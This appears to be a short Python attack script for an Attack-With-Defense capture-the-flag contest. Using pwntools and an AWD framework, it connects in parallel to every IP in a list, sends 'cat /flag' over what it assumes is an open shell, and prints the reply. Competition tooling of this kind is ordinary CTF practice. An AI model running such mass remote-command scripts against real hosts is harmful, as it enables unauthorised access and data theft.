from awdframework.awd import AwdAttack,AwdTask
from os.path import dirname
import pwn

class Exp(AwdTask):
    def __init__(self, ips, port=80):
        super().__init__(ips, port)

    def exp(self, ip):
        sh = pwn.remote(ip, self.port)
        pwn.context.arch = "i386"
        # 本来是 interactive，现在直接执行命令
        # sh.interactive()
        sh.sendline(b"cat /flag")
        result = sh.recv()
        print(result)

ips = []
with open(f"{dirname(__file__)}/../../ip.txt") as f:
    ips = f.read().split("\n")
attacker = AwdAttack(ips=ips,task_class=Exp,port=80,thread_num=5)
attacker.attack()